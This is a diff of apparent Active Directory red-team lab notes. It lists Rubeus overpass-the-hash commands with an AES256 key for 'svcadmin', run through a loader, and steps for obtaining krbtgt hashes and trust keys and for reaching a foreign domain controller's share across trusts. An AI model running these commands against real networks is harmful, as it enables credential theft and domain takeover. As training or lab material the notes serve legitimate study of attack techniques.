@@ -1,4 +1,6 @@
-#### OPtH + Obtain krbtgt hash
+
+##### Cross domain
+OPtH + Obtain krbtgt hash
 ```powershell
 C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
@@ -33,7 +35,9 @@ Run displayed command and add `/ptt`
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args <argumnets> /ptt
 ```
 
-Across external trusts - OPtH and obtain trust key
+##### Cross external trusts 
+
+OPtH and obtain trust key
 ```powershell
 C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
@@ -67,4 +71,3 @@ net view \\eurocorp-dc.eurocorp.LOCAL
 dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 
-ba01bd4d93d9f211a582bb4ec2d6d72b
